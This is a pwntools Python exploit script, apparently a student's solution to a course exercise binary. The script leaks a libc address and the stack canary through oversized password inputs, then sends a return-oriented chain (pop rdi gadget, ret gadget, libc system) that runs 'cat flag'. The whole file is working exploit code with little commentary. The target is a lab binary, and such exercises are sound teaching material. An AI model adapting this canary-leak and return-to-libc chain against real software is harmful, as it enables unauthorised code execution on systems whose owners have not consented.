#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise4/exercise4b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

system_offset = 0x0000000000052290  # readelf -s /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep system
IOfgets_offset = 0x0000000000082630


def get_libc_base_address():
    print(r.recvline())
    r.sendline(b"cat flag")  ## inject our parameter into the 'name' variable 0x4040a0
    print(r.recvuntil(b'Enter the secret password:\n'))
    r.sendline(b'A' * 103)
    output1 = r.recvline()
    print(output1)
    hint = r.recvline()  ### 'IOfgets+154 blabla is not the password\n'
    print(hint)
    libc_base_address = int.from_bytes(hint[0: 6], "little") - 154 - IOfgets_offset
    return libc_base_address


def get_canary():
    print(r.recvuntil(b'Enter the secret password:\n'))
    r.sendline(b'A' * 151)
    output1 = r.recvline()
    print(output1)
    hint = r.recvline()  ### '$printf+9 $2 $3 $NAME $CANARY is not the password\n'
    print(hint)
    canary = hint[0: (-1) * len(" is not the password\n")]
    return canary

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

libc_base_address = get_libc_base_address()
system_address = libc_base_address + system_offset

print(hex(libc_base_address))
print(hex(system_address))

elf = ELF(exe)
rop = ROP(elf)
gadget1 = rop.find_gadget(["pop rdi", "ret"])[0]
gadget2 = (rop.find_gadget(["ret"]))[0]

canary = get_canary()
print(canary)
padding = b'A' * 152 + canary + b'A' * 12

command = padding + p64(gadget1) + p64(0x4040a0) + p64(gadget2) + p64(system_address)

r.sendline(command)

print(r.recvall(timeout=3))
